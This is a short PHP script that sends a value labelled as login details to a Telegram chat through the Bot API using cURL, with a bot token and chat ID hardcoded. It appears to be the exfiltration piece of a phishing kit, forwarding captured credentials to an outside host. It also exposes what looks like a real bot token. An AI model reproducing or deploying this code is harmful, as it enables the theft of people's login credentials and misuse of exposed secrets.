
<?php
$botToken = "6238490076:AAFt4A0GcJuZoUA023u1SEs6wZ59kiEtURU";
$chatId = "5818166313";
$login = "LOGIN_DETAILS";

$url = "https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $chatId;
$url = $url . "&text=" . urlencode($login);
$ch = curl_init();
$optArray = array(
    CURLOPT_URL => $url,
    CURLOPT_RETURNTRANSFER => true
);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
?>